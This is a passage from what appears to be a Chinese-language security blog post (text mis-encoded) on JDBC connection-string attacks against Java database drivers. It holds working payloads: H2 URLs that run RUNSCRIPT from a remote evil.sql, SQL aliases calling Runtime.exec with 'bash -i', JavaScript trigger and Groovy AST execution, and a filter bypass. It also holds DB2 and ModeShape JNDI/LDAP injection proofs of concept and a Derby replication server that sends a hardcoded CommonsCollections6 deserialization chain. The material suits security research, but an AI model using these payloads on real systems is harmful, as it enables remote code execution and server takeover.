alt="image-20241129201226637"></p><p>è¿™å°±æ˜¯è§£æJDBCå­—ç¬¦ä¸²çš„å…³é”®äº†ï¼Œä¼šå¾ªç¯åœ°å»åŒ¹é…å­—ç¬¦å¼€å¤´ï¼šæ¯”å¦‚æˆ‘ä»¬å­—ç¬¦ä¸²ä¸º<code>RUNSCRIPT FROM &#39;http://127.0.0.1:8888/h2_JDBC_Attack.sql&#39;</code>ï¼Œå¼€å¤´Rè¿›å…¥case è°ƒç”¨readR</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201248730.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201248730.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130201248730"></p><p>readRå…ˆè°ƒç”¨findIdentifierEndå»æŸ¥æ‰¾keywordå…³é”®å­—ï¼Œè¿™é‡Œå·²ç»æ‰¾åˆ°RSCRIPTï¼Œä¸è¿‡RIGHT EOW ROWNUMéœ€è¦ä¼˜å…ˆä¾æ¬¡è¿›è¡ŒåŒ¹é…ï¼ŒæœªåŒ¹é…åˆ°æœ€åè°ƒç”¨readIdentifierOrKeywordã€‚è¿™é‡Œå°±å®Œæˆäº†æå–RUNSCRIPT</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201500903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130201500903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130201500903"></p><p>æ¥ç€ç©ºæ ¼ç•¥è¿‡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202515115.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202515115.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130202515115"></p><p>Fromå…³é”®å­—</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202527363.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202527363.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130202527363"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202556448.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202556448.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130202556448"></p><p>æœ€ååˆ†ç¦»å‡ºçš„tokenså¦‚ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202642192.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202642192.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130202642192"></p><p>è§£æå®Œå­—ç¬¦ä¸²ååœ¨prepareCommandä¸­è°ƒç”¨äº†CommandContainer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130203919206.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130203919206.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130203919206"></p><p>æ˜ç¡®äº†è¿™æ˜¯ä¸ªRUNSCRIPTçš„CommandContainerï¼ŒåŒ…è£…åœ¨äº†parseré‡Œé¢</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130204014129.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130204014129.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130204014129"></p><p>ä¹‹åä¼šè°ƒç”¨åˆ°RuntimeScriptCommandé‡Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130204419593.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130204419593.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130204419593"></p><p>ç»§ç»­å›åˆ°Engine.openSessionï¼Œè·Ÿè¿›executeUpdate</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202904432.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130202904432.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130202904432"></p><p>ä¸€ç›´è·Ÿè¿›åˆ°RunScriptCommand.updateï¼Œå¾ªç¯æ‰§è¡Œä»è¿œç¨‹æ–‡ä»¶è¯»åˆ°çš„sqlè¯­å¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130203445113.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130203445113.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130203445113"></p><h3 id="æ”»å‡»æ‰‹æ³•æ€»ç»“"><a href="#æ”»å‡»æ‰‹æ³•æ€»ç»“" class="headerlink" title="æ”»å‡»æ‰‹æ³•æ€»ç»“"></a>æ”»å‡»æ‰‹æ³•æ€»ç»“</h3><p>ç”±äºJDBCè¿æ¥æ—¶<code>INIT</code>åªèƒ½æ‰§è¡Œä¸€æ¡SQLè¯­å¥ï¼Œæ‰€ä»¥æ”»å‡»æ–¹å¼æ¯”è¾ƒæœ‰é™</p><ul><li>èƒ½å‡ºç½‘ï¼Œå¯ä»¥æ‰“RUNSCRIPT</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8888/evil.sql&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> ALIAS IF <span class="keyword">EXISTS</span> shell;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS shell <span class="keyword">AS</span> $$void shell(String s) throws Exception &#123;</span><br><span class="line">    java.lang.Runtime.getRuntime().<span class="keyword">exec</span>(s);</span><br><span class="line">&#125;$$;</span><br><span class="line"><span class="keyword">SELECT</span> shell(<span class="string">&#x27;bash -i ..&#x27;</span>);</span><br></pre></td></tr></table></figure><p>æœ‰å›æ˜¾ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS SHELLEXEC <span class="keyword">AS</span> $$String shellexec(String cmd) throws java.io.IOException&#123;</span><br><span class="line">java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); </span><br><span class="line"><span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;; </span><br><span class="line">&#125;$$;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> SHELLEXEC(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>ä¸å‡ºç½‘</li></ul><p>H2å’ŒMySQLä¸€æ ·æœ‰INFORMATION_SCHEMAã€‚H2æå–URLä¸­çš„é…ç½®æ—¶æ˜¯é€šè¿‡åˆ†å‰²åˆ†å·<code>;</code>æ¥æå–çš„ï¼Œå› æ­¤JSä»£ç ä¸­ä¸èƒ½æœ‰åˆ†å·ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼ˆå¯ä»¥åŠ ä¸Šåæ–œæ ä»£è¡¨è½¬ä¹‰ï¼‰ï¼Œ<code>//javascript</code>æ˜¯H2çš„è¯­æ³•</p><p>åœ¨H2å†…å­˜æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ TRIG_JSï¼Œè¯¥è§¦å‘å™¨åœ¨å‘ INFORMATION_SCHEMA.TABLES è¡¨æ’å…¥æ•°æ®åæ‰§è¡Œã€‚è§¦å‘å™¨çš„ä¸»ä½“æ˜¯ä¸€ä¸ªJavaScriptè„šæœ¬</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS &#x27;//javascript</span><br><span class="line">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œç›®æ ‡æœºå™¨æœ‰groovyä¾èµ–ï¼Œèƒ½æ‰“ASTæ³¨è§£</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-sql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;init=CREATE ALIAS shell2 AS</span><br><span class="line">$$@groovy.transform.ASTTest(value=&#123;</span><br><span class="line">assert java.lang.Runtime.getRuntime().exec(&quot;cmd.exe /c calc.exe&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">def x$$</span><br></pre></td></tr></table></figure><ul><li>ç»•è¿‡</li></ul><p>INITè¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œ<code>TRACE_LEVEL_SYSTEM_OUT</code>,<code>TRACE_LEVEL_FILE</code>,<code>TRACE_MAX_FILE_SIZE</code>èƒ½è§¦å‘å †å æ³¨å…¥ï¼Œåˆ†å·éœ€è¦è½¬ä¹‰</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=1\;CREATE TRIGGER TRIG_JS BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript</span><br><span class="line">Java.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)$$--</span><br></pre></td></tr></table></figure><h2 id="IBM-DB2"><a href="#IBM-DB2" class="headerlink" title="IBM DB2"></a>IBM DB2</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.ibm.db2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>11.5.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªéœ€è¦æ•°æ®åº“å­˜åœ¨æ‰èƒ½æ‰“</p><p>dockerèµ·é¶æœºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull ibmcom/db2express-c:latest</span><br><span class="line">docker run -d --name db2 --privileged=true -p 50000:50000 -e  DB2INST1_PASSWORD=db2admin -e LICENSE=accept ibmcom/db2express-c  db2start</span><br></pre></td></tr></table></figure><p>pocï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/fgfhjn;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DB2JDBCRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);</span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/fgfhjn;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>com.ibm.db2.jcc.am.c0$runå¤„å­˜åœ¨JNDI</p><h2 id="ModeShape"><a href="#ModeShape" class="headerlink" title="ModeShape"></a>ModeShape</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.modeshape<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>modeshape-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.4.1.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥JNDI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;org.modeshape.jdbc.LocalJcrDriver&quot;</span>);</span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:jcr:jndi:ldap://127.0.0.1:1389/q2s3n8&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>org.modeshape.jdbc.delegate.LocalRepositoryDelegateå­˜åœ¨JNDI</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130213136636.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241130213136636.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241130213136636"></p><h2 id="Apache-Derby"><a href="#Apache-Derby" class="headerlink" title="Apache Derby"></a>Apache Derby</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.derby<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>derby<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>10.10.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Derby JNDI Server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Derby_JNDI_Server</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PAYLOAD_FILE</span> <span class="operator">=</span> <span class="string">&quot;cc6.ser&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// your port</span></span><br><span class="line">        <span class="type">int</span>          <span class="variable">port</span>   <span class="operator">=</span> <span class="number">4851</span>;</span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(port);</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC6</span></span><br><span class="line">        String evil=getPayloadContent();</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(evil);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç›´æ¥å‘ socket ä¸­å†™å…¥</span></span><br><span class="line">        socket.getOutputStream().write(decode);</span><br><span class="line">        socket.getOutputStream().flush();</span><br><span class="line">        Thread.sleep(TimeUnit.SECONDS.toMillis(<span class="number">5</span>));</span><br><span class="line">        socket.close();</span><br><span class="line">        server.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getPayloadContent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(PAYLOAD_FILE);</span><br><span class="line">        <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                fis.read(bytes);</span><br><span class="line">                <span class="keyword">return</span> base64encode(bytes);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Payload file not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder,bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNDI Client</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;org.apache.derby.jdbc.EmbeddedDriver&quot;</span>);</span><br><span class="line">    <span class="comment">//DriverManager.getConnection(&quot;jdbc:derby:dbname;create=true&quot;);</span></span><br><span class="line">    DriverManager.getConnection(<span class="string">&quot;jdbc:derby:dbname;startMaster=true;slaveHost=127.0.0.1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆè°ƒç”¨æ³¨é‡Šä¸­çš„create&#x3D;trueåˆ›å»ºä¸€ä¸ªdbnameæ•°æ®åº“ï¼Œæ‰èƒ½é¡ºåˆ©æ‰§è¡Œ</p><p>derbyä¼šè°ƒç”¨<code>ReplicationMessageTransmit$MasterReceiverThread#readMessage</code>å»è§£ææ•°æ®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201104640410.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201104640410.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥å‡½æ•°ä¼šè°ƒç”¨åˆ°org.apache.derby.impl.store.replication.net.SocketConnection.readMessageååºåˆ—åŒ–InputStream</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201104834485.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241201104834485.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241201104834485"></p><p>ç›´æ¥æ‰“å­—èŠ‚ç å³å¯</p><h2 id="JNDIé«˜ç‰ˆæœ¬ä¸­åˆ©ç”¨JDBCç»•è¿‡"><a href="#JNDIé«˜ç‰ˆæœ¬ä¸­åˆ©ç”¨JDBCç»•è¿‡" class="headerlink" title="JNDIé«˜ç‰ˆæœ¬ä¸­åˆ©ç”¨JDBCç»•è¿‡"></a>JNDIé«˜ç‰ˆæœ¬ä¸­åˆ©ç”¨JDBCç»•è¿‡</h2><p>Tomcatå’Œcommons-dbcpè‡ªå¸¦äº†dbcpè¿æ¥æ•°æ®åº“</p><p>dbcpåˆ†ä¸ºdbcp1å’Œdbcp2ï¼ŒåŒæ—¶åˆåˆ†ä¸º commons-dbcp å’Œ Tomcat è‡ªå¸¦çš„ dbcpã€‚è¿™ä¹ˆä¸€ç®—çš„è¯æœ‰å››ä¸ªdhcpçš„ç±»ï¼Œä¸è¿‡å…¶ä¸­ä»£ç éƒ½æ˜¯å¤§è‡´ç›¸åŒçš„</p><p>æ¯”å¦‚tomcatçš„dhcp2ï¼ŒTomcat8è‡ªå¸¦dhcp2ï¼Œ7è‡ªå¸¦dhcp</p><p>ä»¥Tomcat8çš„<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory</code>ä¸ºä¾‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.56<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¯¥factoryç»§æ‰¿äº†ObjectFactory</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214424473.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214424473.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241126214424473"></p><p>é‡å†™äº†getObjectInstance</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214509825.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241126214509825.png" 